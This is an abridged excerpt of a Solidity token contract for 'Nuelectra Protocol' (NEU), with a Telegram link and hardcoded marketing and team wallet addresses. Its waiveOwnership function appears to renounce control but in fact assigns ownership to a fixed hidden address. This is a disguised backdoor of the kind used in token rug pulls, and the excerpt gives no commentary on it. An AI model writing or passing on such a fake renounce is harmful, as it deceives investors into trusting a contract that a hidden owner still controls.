...
/**
Telegram : https://t.me/NuelectraChannel
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x21B0831DDd2aa996A03b9623ee65C7eC9B09d627);
    }
...
contract Nuelectra is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Nuelectra Protocol";
    string private _symbol = "NEU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x464BA5C08dC1332Acd281dF7C73902762A987725);
    address payable public teamWalletAddress = payable(0xb42Ef493601898A23A285c7B2f2557f7009F393b);
